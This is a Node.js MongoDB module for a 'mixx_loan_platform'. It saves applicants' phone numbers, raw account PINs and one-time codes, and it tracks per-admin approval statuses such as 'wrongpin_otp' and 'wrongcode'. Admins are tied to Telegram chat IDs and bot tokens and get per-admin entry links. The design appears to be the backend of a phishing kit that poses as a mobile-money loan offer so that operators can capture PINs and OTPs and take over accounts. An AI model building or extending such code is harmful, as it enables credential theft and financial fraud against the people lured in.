const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = 'mixx_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    SESSIONS: 'sessions'  // ✅ NEW: secure server-side sessions
};

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;
        
        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }
        
        console.log('🔄 Connecting to MongoDB...');
        
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        
        db = client.db(DB_NAME);
        
        console.log('✅ Connected to MongoDB successfully');
        
        // Create indexes for better performance
        await createIndexes();
        
        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        // Admin indexes
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        
        // Application indexes
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        // ✅ Session indexes — token must be unique, auto-expire via TTL
        await db.collection(COLLECTIONS.SESSIONS).createIndex({ token: 1 }, { unique: true });
        await db.collection(COLLECTIONS.SESSIONS).createIndex(
            { expiresAt: 1 },
            { expireAfterSeconds: 0 } // MongoDB TTL — auto-deletes expired sessions
        );
        
        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;
        
        if (!adminId) throw new Error('Admin ID is required (adminId or id property)');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');
        
        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);
        
        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: adminData.chatId,
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };
        
        if (adminData.botToken) adminDocument.botToken = adminData.botToken;
        
        console.log(`💾 Saving admin to database:`, {
            adminId: adminDocument.adminId,
            name: adminDocument.name,
            email: adminDocument.email,
            chatId: adminDocument.chatId,
            status: adminDocument.status
        });
        
        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// ✅ SESSION OPERATIONS (NEW)
// ==========================================

/**
 * Create a new secure session for a customer
 * Called when customer hits /a/:adminId
 */
async function createSession(token, adminId, ip) {
    try {
        const now = new Date();
        const expiresAt = new Date(now.getTime() + 60 * 60 * 1000); // 1 hour from now

        await db.collection(COLLECTIONS.SESSIONS).insertOne({
            token,
            adminId,
            ip: ip || null,
            createdAt: now,
            expiresAt  // MongoDB TTL index auto-deletes this document after expiry
        });

        console.log(`✅ Session created: ${token.substring(0, 8)}... → ${adminId}`);
        return true;
    } catch (error) {
        console.error('❌ Error creating session:', error);
        return false;
    }
}

/**
 * Get session by token — returns null if expired or not found
 */
async function getSession(token) {
    try {
        const session = await db.collection(COLLECTIONS.SESSIONS).findOne({
            token,
            expiresAt: { $gt: new Date() } // Only return non-expired sessions
        });
        return session;
    } catch (error) {
        console.error('❌ Error getting session:', error);
        return null;
    }
}

/**
 * Delete a session (on logout or after use)
 */
async function deleteSession(token) {
    try {
        await db.collection(COLLECTIONS.SESSIONS).deleteOne({ token });
        console.log(`🗑️ Session deleted: ${token.substring(0, 8)}...`);
    } catch (error) {
        console.error('❌ Error deleting session:', error);
    }
}

/**
 * Clean up all expired sessions manually (backup — TTL index handles this automatically)
 */
async function cleanupExpiredSessions() {
    try {
        const result = await db.collection(COLLECTIONS.SESSIONS).deleteMany({
            expiresAt: { $lt: new Date() }
        });
        if (result.deletedCount > 0) {
            console.log(`🧹 Cleaned up ${result.deletedCount} expired session(s)`);
        }
        return result.deletedCount;
    } catch (error) {
        console.error('❌ Error cleaning up sessions:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            otpStatus: appData.otpStatus || 'pending',
            otp: appData.otp || null,
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        });
        
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [{ pinStatus: 'rejected' }, { otpStatus: 'wrongpin_otp' }, { otpStatus: 'wrongcode' }]
        });
        
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE OPERATIONS
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

// Export all functions
module.exports = {
    connectDatabase,
    closeDatabase,
    
    // Admin operations
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    // ✅ Session operations (NEW)
    createSession,
    getSession,
    deleteSession,
    cleanupExpiredSessions,
    
    // Application operations
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    
    // Statistics
    getAdminStats,
    getStats,
    getPerAdminStats,
    
    // Debug & Maintenance
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
